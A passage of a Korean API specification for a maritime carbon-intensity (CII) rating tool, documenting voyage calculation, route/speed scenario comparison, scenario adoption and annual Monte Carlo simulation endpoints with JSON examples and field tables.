| `fuel_uses` | array | Y | **최소 1개 이상** · VAL-006: active fuel_type | 연료 사용량 목록. **동일 `fuel_type`이 여러 행으로 들어오면 Decimal로 합산한다** |
| `fuel_uses[].fuel_type` | string | Y | VAL-006 | 연료 코드 |
| `fuel_uses[].fuel_ton` | decimal | Y | VAL-002: > 0 | 연료 사용량 (ton) |
| `weather_model` | string | N | enum: NONE, SIMPLE_RULE, TOWNSIN_KWON_ALPHA | 기본: NONE |
| `voyage_id` | UUID | N | 이 선박의 살아 있는 항차(다른 선박이면 422 · 없으면 404) | **[#817] 이 계산이 어느 항차의 것인가.** 주면 계산 이력(`calculation_run.voyage_id`)이 그 항차에 붙어, 항차 계획이 바뀔 때 재계산 필요(`needs_recalc`)로 표시된다(`PRD §8.4`). **결과와 `input_hash`에는 영향이 없다** — 이력의 주소일 뿐이다. 기능① 「계획 저장」이 만든 항차에 계산을 한 번 더 기록할 때 쓴다(`PRD §10.5`) |

#### 응답 (200 OK)

> **[ORACLE-C-1 정정]** Layer 1 결정론 값을 JSON 문자열로 직렬화한다 (§1.7 참조).
>
> **[ORACLE-C-3 추가]** `parameters_used`를 응답에 포함한다 (TECH_SPEC §5.2.1).
>
> **[ORACLE-S-5 정정]** `calculation_basis` 필드명을 TECH_SPEC과 통일했다 (`a_decimal`, `c`).

```json
{
  "data": {
    "attained_cii": "4.982400",
    "required_cii": "5.045066",
    "ratio_to_required": "0.98758",
    "estimated_rating": "C",
    "rating_boundary_cii": {
      "superior_boundary": "4.338757",
      "lower_boundary": "4.742362",
      "upper_boundary": "5.347770",
      "inferior_boundary": "5.953178"
    },
    "next_worse_boundary_margin": "0.365370",
    "next_worse_boundary_margin_ratio": "0.0724",
    "co2_emission_ton": "249.12",
    "fuel_consumption_ton": "80.00",
    "distance_nm": 1000.0,
    "risk_level": "MEDIUM",
    "transport_capacity": "50000",
    "transport_capacity_basis": "DWT",
    "reference_capacity": "50000",
    "reference_capacity_rule": "DWT",
    "annual_impact": {
      "before": { "attained_cii": "8.965894", "rating": "E" },
      "after": { "attained_cii": "8.350259", "rating": "E" },
      "rating_changed": false
    },
    "calculation_basis": {
      "ship_type": "BULK_CARRIER",
      "z_factor_percent": "11.0",
      "fuel_cf_details": [
        { "fuel_type": "HFO", "cf": "3.114", "fuel_ton": "80.0" }
      ],
      "a_decimal": "4745",
      "c": "0.622"
    }
  },
  "parameters_used": {
    "regulation_year": {
      "year": "2026",
      "z_factor_percent": "11.0"
    },
    "fuel_types": [
      { "code": "HFO", "cf": "3.114" }
    ],
    "reference_line": {
      "ship_type": "BULK_CARRIER",
      "reference_capacity_rule": "DWT",
      "a_decimal": "4745",
      "c": "0.622"
    },
    "rating_boundary": {
      "d1": "0.86",
      "d2": "0.94",
      "d3": "1.06",
      "d4": "1.18"
    },
    "parameter_source_version": "imo-mepc-2024-q1"
  },
  "calculation_run_id": "uuid",
  "model_version": {
    "engine": "dual-precision-v1",
    "decimal_precision": 30,
    "decimal_rounding": "ROUND_HALF_UP",
    "rng_algorithm": "PCG64DXSM",
    "numpy_version": "2.1.0",
    "python_version": "3.12.4"
  },
  "input_hash": "sha256:a1b2c3d4...",
  "parameter_hash": "sha256:e5f6g7h8...",
  "warnings": [
    "REFERENCE_ONLY"
  ],
  "disclaimer": "참고용 예측값입니다. 규제 제출용 공식 결과가 아닙니다.",
  "meta": {
    "request_id": "uuid",
    "timestamp": "2026-07-03T12:00:00Z",
    "duration_ms": 42
  }
}
```

**등급 E 응답 예시** (#171) — 같은 선박·연도에 연료량만 늘린 경우다. 위 예시와
다른 부분만 봐도 된다:

```json
{
  "data": {
    "attained_cii": "12.456000",
    "required_cii": "5.045066",
    "ratio_to_required": "2.46895",
    "estimated_rating": "E",
    "next_worse_boundary_margin": null,
    "next_worse_boundary_margin_ratio": null,
    "co2_emission_ton": "622.80",
    "fuel_consumption_ton": "200.00",
    "distance_nm": 1000.0,
    "risk_level": "CRITICAL"
  }
}
```

> `next_worse_boundary_margin` · `next_worse_boundary_margin_ratio`는 **등급 E에서
> `null`**이다 — 최하위 등급이라 악화 방향 경계가 존재하지 않는다 (#171). 화면은
> 「해당 없음 — 최하위 등급」 문구로 표시한다(DESIGN_SYSTEM §2.5). 위 값은 실제
> 구현 응답에서 추출한 것으로, 전체 응답에서 `data`의 계산 필드만 발췌했다
> (`parameters_used` 등 나머지 구조는 동일하다).

#### 응답 필드·JSON 타입

Layer 1 결정론 수치는 **JSON 문자열**로 직렬화한다(§1.7). 입력 에코 값은 숫자다.

**최상위 (envelope)**

| 경로 | JSON 타입 |
|---|---|
| `data` | object |
| `parameters_used` | object |
| `calculation_run_id` | string (UUID) |
| `model_version` | object — **혼합 타입**. `decimal_precision`만 number, 나머지(`engine` · `decimal_rounding` · `rng_algorithm` · `numpy_version` · `python_version`)는 string |
| `input_hash` · `parameter_hash` | string (`sha256:…`) |
| `warnings` | array of string |
| `disclaimer` | string |
| `meta` | object — `request_id` string · `timestamp` string(ISO8601) · `duration_ms` number |

**`data.*`**

| 경로 | JSON 타입 | 비고 |
|---|---|---|
| `attained_cii` | **string** | Layer 1 |
| `required_cii` | **string** | Layer 1 |
| `ratio_to_required` | **string** | Layer 1 |
| `estimated_rating` | string | enum `A`~`E` |
| `rating_boundary_cii` | **object** | Layer 1. 등급 경계 CII 4종(`superior`·`lower`·`upper`·`inferior`) — 값은 **string 6자리**. **화면이 `required_cii × d`로 다시 만들지 않게** 서버가 싣는다 (`#1371`) |
| `next_worse_boundary_margin` | **string \| null** | Layer 1. **등급 E는 `null`** — 최하위 등급이라 악화 방향 경계가 없다 (#171) |
| `next_worse_boundary_margin_ratio` | **string \| null** | Layer 1. 등급 E는 `null` (#171) |
| `co2_emission_ton` | **string** | Layer 1 |
| `fuel_consumption_ton` | **string** | Layer 1. 입력 연료량 전체의 합 |
| `distance_nm` | **number** | 입력 에코 |
| `risk_level` | string | enum `LOW` \| `MEDIUM` \| `HIGH` \| `CRITICAL` (PRD §9.4.1) |
| `transport_capacity` | **string** | |
| `transport_capacity_basis` | string | enum `DWT` \| `GT` |
| `reference_capacity` | **string** | |
| `reference_capacity_rule` | string | **enum이 아니다** — 파라미터 테이블 값 그대로 (`DWT` · `GT` · `fixed 279000` 등) |
| **`annual_impact`** | **object \| null** | **[#1338] 「연간 반영 시 변화」**(`PRD §10.3` ⑨ · `§10.4` 출력 행). `before`·`after` 각각 `{attained_cii, rating}` · `rating_changed` bool. **기초 자료가 없으면 `null`** — 확정 실적도 잔여 계획도 없으면 비교할 「기존 연말 예상」이 없다 · 아래 각주 |
| `calculation_basis` | object | 아래 |

> **[#1338] `annual_impact`는 기능①의 항차 CII와 다른 질문에 답한다.** 항차 CII는 **이 항차 하나**를, 이 블록은 **그 배의 한 해 전체**를 본다. **수준이 어긋나는 것이 정상**이다 — 데모 시드 실측(같은 항차 3,000 nm · HFO 250 t)에서 벌크 50,000은 **항차 등급 `C`에 연말 `E`**, 컨테이너는 **항차 등급 `E`에 연말 `B`**다. 화면이 둘을 같은 값으로 다루면 안 된다.
>
> **조립을 새로 만들지 않는다** — `§2.14` ⑶(실시간 CII의 연말 예상)과 기능③이 쓰는 `load_projection_context`·`collect_annual_inputs`·`project_deterministic`을 그대로 부른다. 조립이 둘이면 **같은 선박·같은 연도에서 두 화면이 다른 숫자**를 낸다(`#798` 실측: 7.654488 vs 8.971119).
>
> **`null`인 경우** — `PRD §10.3` ⑨가 *「연간 시뮬레이터에 **이미 동일 선박·연도 데이터가 있으면**」*으로 조건을 달았다. 확정 실적도 잔여 계획도 없으면 비교할 「기존 연말 예상」이 없으므로 **0과 비교한 숫자를 지어내지 않는다.** 규정 파라미터가 없거나 거리가 0이어도 `null`이다 — **이 블록의 실패가 항차 CII 계산을 막지 않는다**(`PRD §16.2` 오류 격리).
>
> **자릿수는 `attained_cii`와 같은 6자리**다. 한 응답 안에서 같은 양이 다른 자릿수로 실리면 화면이 둘을 다른 종류의 값으로 다루게 된다.
>
> ⚠️ **`input_hash`·`parameter_hash`는 바뀌지 않는다** — 이 블록은 **파생 출력**이지 입력이 아니다. 저장되는 `result_json`에는 함께 들어간다.

**`data.calculation_basis.*`**

| 경로 | JSON 타입 |
|---|---|
| `ship_type` | string |
| `z_factor_percent` | **string** |
| `fuel_cf_details` | array of object. **연료 종류별 한 행으로 정규화한다** |
| `fuel_cf_details[].fuel_type` | string |
| `fuel_cf_details[].cf` | **string** |
| `fuel_cf_details[].fuel_ton` | **string**. 동일 `fuel_type` 입력 행의 합 |
| `a_decimal` | **string** |
| `c` | **string** |

`parameters_used` 하위 수치(`z_factor_percent` · `cf` · `a_decimal` · `c` · `d1`~`d4`)와 `parameter_source_version`도 모두 string이다.

> `risk_level` 산정 기준은 **PRD §9.4.1**(결정론 화면 — 기능①·②, `등급 + margin_ratio`)과 **PRD §9.4.2**(확률 화면 — 기능③, `목표 등급 달성 확률`) 참조. 두 절이 임계값 표를 소유하며, 이 문서는 값을 전사하지 않는다.

---

## 5. Scenario Comparison API (기능②)

### 5.1 시나리오 비교 계산

```http
POST /api/v1/scenarios/compare
```

#### 요청 Body

```json
{
  "vessel_id": "uuid",
  "regulation_year": 2026,
  "current_lat": 35.0,
  "current_lon": 129.0,
  "destination_port_name": "Rotterdam",
  "destination_lat": 51.9244,
  "destination_lon": 4.4778,
  "current_speed_kn": 14.0,
  "fuel_type": "HFO",
  "base_daily_foc_ton": 18.0,
  "direct_distance_nm": 11000.0,
  "detour_distance_nm": 11550.0,
  "slow_speed_kn": 13.0,
  "weather_model": "NONE"
}
```

> **이 예시는 실행해서 얻은 값이다 (`#151`).** 아래 응답 블록 셋은 위 요청을 **그대로** 보내 받은 응답이며, 재현하려면 **기준 선박의 제원**이 함께 정해져야 한다.
>
> | 가정 | 값 | 출처 |
> |---|---|---|
> | 대상 선박 | 샘플 벌크선 (50,000 DWT) | `db/demo_seed.py` 고정 UUID `…0001` |
> | `reference_speed_kn` | **12.00** | 같은 곳 (`#639`가 정본 픽스처에서 역산) |
> | `fuel_type` CF | 3.114 | `DB_SCHEMA §3.2` |
> | 규제연도 | 2026 (`z = 11.0%`) | `DB_SCHEMA §3.3` |
>
> **`reference_speed_kn`이 빠져 있던 것이 종전 예시가 재현되지 않은 원인이다.** 연료 추정은 cubic speed model — `daily_foc × (v/v_ref)³ × distance/(v×24)` — 이라 `v_ref` 없이는 `fuel_ton`이 정해지지 않는다. 종전 예시는 `v_ref = 14`(= `current_speed_kn`)를 암묵 가정한 듯하나 그 값으로도 인쇄된 `780`이 나오지 않았다.
>
> `base_daily_foc_ton`을 종전 `35.0`에서 **`18.0`으로 낮췄다** — `35.0`이면 세 시나리오가 모두 등급 `E`가 되어 `next_worse_boundary_margin`이 전부 `null`이 되고, `[ORACLE-S-1]`이 이 필드를 추가한 목적이 예시에서 사라진다. `18.0`은 **감속이 등급을 한 단계 올리는**(C → B) 구간이라 기능②가 무엇을 보이는 기능인지 예시가 그대로 설명한다.

> ⚠️ **`weather_model`을 `NONE`으로 둔다.** 종전 예시의 `SIMPLE_RULE`은 Open-Meteo를 실제로 호출하므로 **문서 예시가 외부 서비스의 그날 값에 따라 달라진다** — 재현 가능한 예시가 아니다. 보정 모델의 응답 필드는 `weather_factor`·`weather_model_used`로 그대로 보인다.

| 필드 | 타입 | 필수 | 검증 | 설명 |
|---|---|---|---|---|
| `vessel_id` | UUID | Y | 존재 확인 | 대상 선박 |
| `regulation_year` | int | Y | VAL-005 | 등급 기준연도 |
| `current_lat` | decimal | 조건부 | VAL-007: −90 ~ +90 | 현재 위도. `direct_distance_nm`이 없으면 목적항 좌표와 함께 필요(서비스가 검증) — #830 정정, 종전 「Y」 |
| `current_lon` | decimal | 조건부 | VAL-007: −180 ~ +180 | 현재 경도. 위와 같다 |
| `destination_port_name` | string | N | 최대 200자 | 목적항 이름. **표기용이라 계산에 쓰지 않는다** — 요청 예시에는 있었으나 이 표에 없었다 (`#1454`) |
| `destination_lat` | decimal | 조건부 | VAL-007 | 목적항 위도 (거리 자동 계산 시 필요) |
| `destination_lon` | decimal | 조건부 | VAL-007 | 목적항 경도 |
| `current_speed_kn` | decimal | Y | VAL-009: ≥ 1.0 | 현재 속도 |
| `fuel_type` | string | Y | VAL-006 | 연료 종류 |
| `base_daily_foc_ton` | decimal | 조건부 | VAL-002 | 선박 기준값 없을 시 필요 |
| `direct_distance_nm` | decimal | 조건부 | VAL-002 | 좌표 있으면 자동 계산 |
| `detour_distance_nm` | decimal | N | VAL-002 | 기본: direct × 1.05 |
| `slow_speed_kn` | decimal | N | VAL-009: ≥ 1.0 | 감속 속도. **미지정 시 서버가 `max(current_speed - 1, 1.0)`으로 계산** |
| `weather_model` | string | N | enum | 기본: NONE |

#### 응답 (200 OK)

> **[ORACLE-S-1 정정]** 각 시나리오에 PRD §9.2 필수 출력 필드(`required_cii`, `ratio_to_required`, `next_worse_boundary_margin`, `calculation_basis`)를 추가했다.
>
> **[EXT-P0-5]** 각 시나리오에 `scenario_id`를 추가했다. 클라이언트는 이 ID로 `/scenarios/{scenario_id}/adopt`를 호출한다.
>
> **[EXT-3-1]** `calculation_basis`에 `transport_capacity`와 `reference_capacity`를 추가했다 (P0-1 이중 capacity 규칙).

```json
{
  "data": {
    "scenarios": [
      {
        "scenario_id": "uuid",
        "scenario_type": "DIRECT",
        "scenario_name": "직항",
        "distance_nm": 11000.0,
        "speed_kn": 14.0,
        "duration_hours": "785.7143",
        "fuel_ton": "935.76",
        "co2_emission_ton": "2913.97",
        "attained_cii": "5.298125",
        "required_cii": "5.045066",
        "ratio_to_required": "1.05016",
        "estimated_rating": "C",
        "next_worse_boundary_margin": "0.049645",
        "next_worse_boundary_margin_ratio": "0.0098",
        "risk_level": "HIGH",
        "weather_factor": 1.0,
        "weather_model_used": "NONE",
        "calculation_basis": {
          "ship_type": "BULK_CARRIER",
          "transport_capacity": "50000",
          "transport_capacity_basis": "DWT",
          "reference_capacity": "50000",
          "reference_capacity_rule": "DWT",
          "z_factor_percent": "11.0",
          "a_decimal": "4745",
          "c": "0.622"
        }
      },
      {
        "scenario_id": "uuid",
        "scenario_type": "DETOUR",
        "scenario_name": "우회",
        "distance_nm": 11550.0,
        "speed_kn": 14.0,
        "duration_hours": "825.0000",
        "fuel_ton": "982.55",
        "co2_emission_ton": "3059.67",
        "attained_cii": "5.298125",
        "required_cii": "5.045066",
        "ratio_to_required": "1.05016",
        "estimated_rating": "C",
        "next_worse_boundary_margin": "0.049645",
        "next_worse_boundary_margin_ratio": "0.0098",
        "risk_level": "HIGH",
        "weather_factor": 1.0,
        "weather_model_used": "NONE",
        "calculation_basis": {
          "ship_type": "BULK_CARRIER",
          "transport_capacity": "50000",
          "transport_capacity_basis": "DWT",
          "reference_capacity": "50000",
          "reference_capacity_rule": "DWT",
          "z_factor_percent": "11.0",
          "a_decimal": "4745",
          "c": "0.622"
        }
      },
      {
        "scenario_id": "uuid",
        "scenario_type": "SLOW_STEAMING",
        "scenario_name": "감속",
        "distance_nm": 11000.0,
        "speed_kn": 13.0,
        "duration_hours": "846.1538",
        "fuel_ton": "806.86",
        "co2_emission_ton": "2512.55",
        "attained_cii": "4.568281",
        "required_cii": "5.045066",
        "ratio_to_required": "0.90549",
        "estimated_rating": "B",
        "next_worse_boundary_margin": "0.174081",
        "next_worse_boundary_margin_ratio": "0.0345",
        "risk_level": "MEDIUM",
        "weather_factor": 1.0,
        "weather_model_used": "NONE",
        "calculation_basis": {
          "ship_type": "BULK_CARRIER",
          "transport_capacity": "50000",
          "transport_capacity_basis": "DWT",
          "reference_capacity": "50000",
          "reference_capacity_rule": "DWT",
          "z_factor_percent": "11.0",
          "a_decimal": "4745",
          "c": "0.622"
        }
      }
    ],
    "summary": {
      "lowest_cii_scenarios": ["SLOW_STEAMING"],
      "shortest_duration_scenarios": ["DIRECT"],
      "lowest_fuel_scenarios": ["SLOW_STEAMING"]
    }
  },
  "parameters_used": { ... },
  "calculation_run_id": "uuid",
  "model_version": { ... },
  "input_hash": "sha256:...",
  "parameter_hash": "sha256:...",
  "warnings": [
    "REFERENCE_ONLY"
  ],
  "disclaimer": "참고용 예측값입니다. 규제 제출용 공식 결과가 아닙니다.",
  "meta": { ... }
}
```

> `summary`는 특정 시나리오를 "추천"하지 않고, 지표별 최소값만 중립적으로 표시한다 (PRD §11.2, AC-F2-005).

> **[#799 정정] 세 필드가 배열이다 — 동률이면 전부 싣는다.** 종전에는 `lowest_cii_scenario`처럼 단수 문자열이었고 동률에서 **먼저 등장한 시나리오 하나**만 실렸다. **같은 값 중 하나만 지목하는 것은 그 자체가 추천**이라 바로 위 문장과 어긋난다.
>
> 동률은 드문 일이 아니라 **정의상 필연**인 경우가 있다 — `PRD §11.4.1` cubic speed model에서 연료는 거리에 비례하고 AER은 거리로 나누므로, **같은 속도의 직항과 우회는 `attained_cii`가 정확히 같다**(`#799` 실측: 둘 다 `4.982400`).
>
> 비교는 **응답에 실리는 자릿수**로 한다. 내부 `Decimal`은 `TECH_SPEC §1.2.1`상 30자리라 거리가 소거되는 직항·우회도 끝자리가 갈리는데, 그대로 비교하면 **응답에 같은 값이 실려 있는데 동률이 아니라고 판정**한다.

> **`DIRECT`와 `DETOUR`의 `attained_cii`가 같다 — 오기가 아니다 (`#151`).**
>
> `attained CII = M / (W × D)`인데 우회는 **`M`과 `D`를 같은 비율로** 키운다(속도가 같으므로 연료가 거리에 비례한다). 비율이 그대로이므로 등급도 그대로다.
>
> ```
> DIRECT   935.76t / 11,000nm  →  5.298125
> DETOUR   982.55t / 11,550nm  →  5.298125     (982.55 / 935.76 = 11,550 / 11,000 = 1.05)
> ```
>
> **우회가 바꾸는 것은 등급이 아니라 절대 배출량과 소요 시간**이다 — `co2_emission_ton`과 `duration_hours`가 그것을 보인다. 화면이 셋을 나란히 보이는 이유가 여기 있다: 등급만 보면 우회를 고를 이유가 없어 보이지만, 그 선택의 대가는 **연간 누적**에 쌓인다.
>
> 반대로 `SLOW_STEAMING`은 거리를 그대로 두고 `M`만 줄이므로 **등급이 실제로 움직인다**(C → B).

### 5.2 시나리오 채택

```http
POST /api/v1/scenarios/{scenario_id}/adopt
```

선택한 시나리오를 Voyage 계획값으로 반영한다.

#### 요청 Body

```json
{
  "target_voyage_id": "uuid",
  "adopt_mode": "UPDATE_EXISTING_PLAN"
}
```

| 필드 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `target_voyage_id` | UUID | Y | 반영할 대상 항차 ID. `CREATE_NEW_VOYAGE` 모드 시 신규 항차 생성 |
| `adopt_mode` | string | N | 기본: `UPDATE_EXISTING_PLAN`. `CREATE_NEW_VOYAGE` 시 신규 항차 생성 (departure_port_name, arrival_port_name, planned_departure_at 추가 필요) |

#### 응답 (200 OK)

```json
{
  "data": {
    "voyage_id": "uuid",
    "adopted_scenario_type": "SLOW_STEAMING",
    "updated_fields": [
      "planned_distance_nm",
      "planned_speed_kn",
      "planned_arrival_at",
      "planned_fuel_ton"
    ],
    "invalidated_calculation_runs": 2
  },
  "meta": { ... }
}
```

| 필드 | 타입 | 설명 |
|---|---|---|
| `voyage_id` | UUID | 반영된 항차. `CREATE_NEW_VOYAGE`면 **새로 만든** 항차 |
| `invalidated_calculation_runs` | int | 이번 채택으로 **새로 재계산 필요 표시가 붙은** 그 항차의 계산 결과 수. 이미 표시된 결과는 세지 않으므로 `0`은 「계산 이력이 없다」와 「이미 전부 표시돼 있다」 둘 다일 수 있다 (#830 정정 — 종전 예시에 없었다) |
| `updated_fields` | string[] | 채택이 **실제로 바꾼** 값 (아래) |

##### `updated_fields` — 계획 연료도 포함한다 [#1072]

| 필드 | 무엇이 들어가나 |
|---|---|
| `planned_distance_nm` | 시나리오 거리 |
| `planned_speed_kn` | 시나리오 속력 |
| `planned_arrival_at` | 출발 예정 시각 + 시나리오 소요 시간. **출발 시각을 모르면 `null`이다** — 지금 시각으로 채우면 계획이 「지금 출발한다」로 바뀐다 |
| **`planned_fuel_ton`** | **시나리오 연료량.** `voyage_fuel_use`의 열이지만 사용자가 「무엇이 바뀌었나」로 읽는 단위라 같은 목록에 둔다 |

> **두 모드가 같은 계획 연료를 남긴다.** 종전에는 `CREATE_NEW_VOYAGE`만 시나리오 연료를 쓰고 `UPDATE_EXISTING_PLAN`은 **연료를 그대로 두었다** — 같은 시나리오인데 채택 방식에 따라 연간 예상 결과가 갈렸다. 우회(거리↑) 시나리오는 「새 거리 + 옛 연료」가 되어 CII가 실제보다 **좋게**, 감속(연료↓) 시나리오는 **나쁘게** 나왔다. 화면이 도달하는 경로는 `UPDATE_EXISTING_PLAN` 하나뿐이라(`UIFLOW 2-2`) 그쪽이 틀린 쪽이었다.
>
> **출처는 `MODEL_ESTIMATE`다.** 사용자가 적은 값이 아니라 모델 추정값이므로 `voyage_fuel_use.source`에 그것을 남긴다 — `CREATE_NEW_VOYAGE`가 쓰는 값과 같다.
>
> **유종이 여럿이면 기존 비중대로 안분한다.** 시나리오 행에는 연료 **종류**가 없으므로(`DB_SCHEMA §2.4`는 양만 갖는다) 종류는 항차가 이미 가진 것을 두고 **양만** 바꾼다. 비중을 유지하면 채택 전후로 **CF 혼합이 바뀌지 않아** CO₂ 차이가 오직 연료량에서만 나온다. 4자리로 반올림한 몫의 **잔차는 비중이 가장 큰 행이 흡수**해 합이 시나리오 총량과 정확히 같다.
>
> **비중이 없는 행(`planned_fuel_ton`이 `null`이거나 0)은 건드리지 않는다.** `chk_fuel_positive`(마이그레이션 046)가 `null` 아니면 `> 0`을 요구하므로 0으로 덮으면 채택이 거부된다. 총량은 양수 비중을 가진 행에만 나눈다.
>
> **연료 행이 아예 없는 항차**는 `CREATE_NEW_VOYAGE`와 같은 규칙(원본 항차 유종 → 선박 기본 연료)으로 한 행을 만든다. CSV로 항차만 먼저 올린 경우에 실제로 나오는 상태다(`#1095` ⑵).
>
> **연료 종류를 알 수 없으면 연료만 건너뛰고 `updated_fields`에서 그 필드를 뺀다.** 원본 항차에 연료 행이 없고 선박에 기본 연료(`default_fuel_type`)도 없으면 넣을 종류가 없다. 그 때문에 거리·속력·도착시각 갱신까지 거부하면 **사용자가 하려던 일 전체가 막힌다** — 채택의 본체는 계획값 갱신이다. **바꾸지 않은 것을 바꿨다고 적지 않으므로** 응답의 `updated_fields`가 세 필드만 담는다. (`CREATE_NEW_VOYAGE`는 다르다 — 연료 종류 없이 새 항차를 만들 수 없어 `422`다.)
>
> **과거 채택분은 소급 수정하지 않는다.** 저장된 계산을 건드리지 않는 것이 이 제품의 규율이고(`TECH_SPEC §5.4` immutable), 재계산 필요 표시는 이미 붙는다.

> 시나리오 채택 시 해당 Voyage의 계산 결과는 무효화되고 재계산 필요 표시가 설정된다 (PRD §8.4).

---

## 6. Annual CII Simulation API (기능③)

### 6.1 연간 시뮬레이션 실행

```http
POST /api/v1/annual-simulations
```

#### 요청 Body

```json
{
  "vessel_id": "uuid",
  "regulation_year": 2026,
  "target_rating": "B",
  "simulation_runs": 5000,
  "random_seed": 12345,
  "distribution_profile": "DEFAULT",
  "apply_feedback_factor": false,
  "as_of": "2026-08-01T00:00:00Z",
  "alternative_fuel": "LNG"
}
```

| 필드 | 타입 | 필수 | 검증 | 설명 |
|---|---|---|---|---|
| `vessel_id` | UUID | Y | 존재 확인 | 대상 선박 |
| `regulation_year` | int | Y | VAL-005 | 기준연도 |
| `target_rating` | string | Y | enum: A, B, C, D (E 불가, PRD §12.8) | 목표 등급 |
| `simulation_runs` | int | N | 1000 이상. **10000 초과는 10000으로 잘라 실행하고 `SIMULATION_RUNS_CLAMPED`를 싣는다** (`PRD §12.8` · #830) | Monte Carlo 반복 횟수. 기본 5000 |
| `random_seed` | int/string | N | 0 ~ 2^128-1. 큰 값은 문자열로 전송 권장 | 미지정 시 서버가 128-bit entropy 자동 생성. 응답의 `rng_metadata.seed_entropy`에서 hex 형태로 반환 |
| `distribution_profile` | string | N | enum: DEFAULT | 기본: DEFAULT |
| `apply_feedback_factor` | bool | N | — | 실적 보정계수(`PRD §12.2.1`)를 잔여 계획 연료에 곱한다. **기본 `false`** — 켜지 않은 실행은 종전과 같은 결과·같은 `input_hash`다(`§6.1.2` · #363) |
| `alternative_fuel` | string | N | 활성 연료 코드(422) | 대체 연료 지렛대(민감도)에서 쓸 연료. **질량 유지**로 계산한다 — 연료량은 그대로, CF만 교체(`PRD §12.6` 각주 · #756 ⑴). 고르지 않으면 블록도 `input_hash` 키도 없다 |
| `as_of` | string (ISO 8601) | N | — | **기준 시각** (`TECH_SPEC §5.4.1` 계약 ⑵ · #816 ⑴). 확정 실적은 **도착 시각 ≤ `as_of`** 인 것만 담는다. **잔여 계획은 날짜로 자르지 않는다** (`#1323` 정정) — 두 집합을 가르는 것은 **연간 반영 정책**이다(`INCLUDE_AS_ACTUAL` ↔ `INCLUDE_AS_PLAN`). 미지정 시 서버가 현재 시각으로 확정하고 응답 `meta.as_of`에 실어 반환한다. ⚠️ **「잔여 = 도착 예정 > `as_of`」로 적던 종전 문장은 구멍을 만들었다** — 도착 예정이 지난 `INCLUDE_AS_PLAN` 항차(지연된 `IN_PROGRESS` · 기한이 지난 `PLANNED`)가 **확정분에도 잔여분에도 들지 않아** 연말 예상에서 통째로 사라졌다(실측 등급 **D → C**). `PRD §12.2`의 `remaining_voyages` 행은 대상을 **상태**로 적고 날짜로 자르지 않으며, `AGENTS §3.1`상 `PRD`가 앞선다. **예정일이 지났다는 것은 도착했다는 뜻이 아니다** — 그 상태를 알리는 것은 `IN_PROGRESS_PAST_ETA` 경고의 몫이고(`§1.6`) 집계에서 빼는 근거가 아니다. ⚠️ **명시한 실행에만 `as_of`가 `input_hash` 키로 들어간다**(`§1.10` 계약 ⑶ — `apply_feedback_factor`와 같은 선택 키 방식). 미지정 실행의 해시는 종전과 같다 |

> **[ORACLE-S-3 정정]** `random_seed` 타입과 크기를 명확히 했다. JSON int는 2^53까지만 안전하게 표현 가능하므로, 큰 seed 값(2^53 초과)은 문자열로 전송해야 한다. 서버는 응답에서 항상 `rng_metadata.seed_entropy`에 128-bit hex 표기를 포함한다.

#### 오류

| Status | Code | 조건 |
|---|---|---|
| 422 | `VALIDATION_ERROR` | target_rating = E (PRD §12.8: 실행 거부) |
| 422 | `VALIDATION_ERROR` | 잔여 항차 200개 초과 (PRD §12.8: DoS 방지) |
| 422 | `CALCULATION_ERROR` | **확정 실적도 거리 있는 잔여 계획도 없다** — `completed_W + planned_W = 0` (PRD §12.8: 계산 중단). 새로 등록한 선박 · 항차가 전부 DRAFT/EXCLUDE인 선박 · 계획 항차가 모두 연료 없음(`SIMULATION_PLAN_NO_FUEL`로 제외)이고 확정 실적도 없는 선박이 여기 걸린다. **500이 아니다** — 서버 고장이 아니라 항차를 등록하면 풀리는 상태다. `§6.4` 재현도 같은 코드·같은 문구를 쓴다 (`#1084`) |

#### 응답 (200 OK)

> **[ORACLE-S-2 정정]** 민감도 분석에 거리 ±5% 및 연료 CF 대체 시나리오를 추가했다 (PRD §12.6 전체 변수 커버).
>
> **[ORACLE-M-3 정정]** `interaction_note`를 JSON 응답에 포함했다.

```json
{
  "data": {
    "simulation_id": "uuid",
    "deterministic": {
      "projected_attained_cii": "5.02",
      "projected_rating": "C",
      "completed_voyage_count": 8,
      "remaining_voyage_count": 4,
      "completed_M_gco2": "1992960000",
      "completed_W_capacity_nm": "400000000",
      "planned_M_gco2": "996480000",
      "planned_W_capacity_nm": "200000000"
    },
    "reduction_plan": {
      "target_rating": "B",
      "target_cii": "4.742300",
      "allowed_planned_M_gco2": "665580000.000000",
      "required_cut_gco2": "330900000.000000",
      "required_cut_fuel_ton": "36.260000",
      "achievable": true
    },
    "feedback": {
      "factor": "1.064516",
      "sample_size": 4,
      "min_sample": 3,
      "requested": false,
      "applied": false
    },
    "monte_carlo": {
      "rng_metadata": {
        "seed_entropy": "0x000000000000000000000000003039",
        "bit_generator": "PCG64DXSM",
        "numpy_version": "2.1.0",
        "python_version": "3.12.4",
        "platform": "Linux-6.5.0-x86_64"
      },
      "runs": 5000,
      "rating_probabilities": {
        "A": "0.0200",
        "B": "0.2800",
        "C": "0.5500",
        "D": "0.1300",
        "E": "0.0200"
      },
      "target_success_probability": "0.3000",
      "target_rating": "B",
      "p10": "4.7100",
      "p50": "5.0400",
      "p90": "5.4200",
      "mean_cii": "5.0600"
    },
    "risk_level": "HIGH",
    "sensitivity_analysis": {
      "interaction_note": "각 변수의 개별 효과만 표시합니다. 복합 효과는 포함되지 않습니다.",
      "speed_minus_1kn": {
        "projected_cii": "4.85",
        "rating_change": "C→B",
        "target_probability_change": "+0.12"
      },
      "speed_plus_1kn": {
        "projected_cii": "5.21",
        "rating_change": "C→C",
        "target_probability_change": "-0.08"
      },
      "fuel_minus_10pct": {
        "projected_cii": "4.89",
        "rating_change": "C→B",
        "target_probability_change": "+0.10"
      },
      "fuel_plus_10pct": {
        "projected_cii": "5.18",
        "rating_change": "C→C",
        "target_probability_change": "-0.06"
      },
      "distance_minus_5pct": {
        "projected_cii": "5.02",
        "rating_change": "C→C"
      },
      "distance_plus_5pct": {
        "projected_cii": "5.02",
        "rating_change": "C→C"
      },
      "fuel_cf_alternative": {
        "alternative_fuel": "LNG",
        "alternative_cf": "2.750000",
        "projected_cii": "4.730269",
        "co2_change": "-6.3%",
        "rating_change": "C→C"
      },
      "voyage_minus_1": {
        "projected_cii": "5.12",
        "rating_change": "C→C"
      },
      "voyage_plus_1": {
        "projected_cii": "4.95",
        "rating_change": "C→C"
      }
    },
    "snapshot": {
      "snapshot_id": "uuid",
      "created_at": "2026-07-03T12:00:00Z",
      "voyage_count": 12
    }
  },
  "parameters_used": { ... },
  "calculation_run_id": "uuid",
  "model_version": { ... },
  "input_hash": "sha256:...",
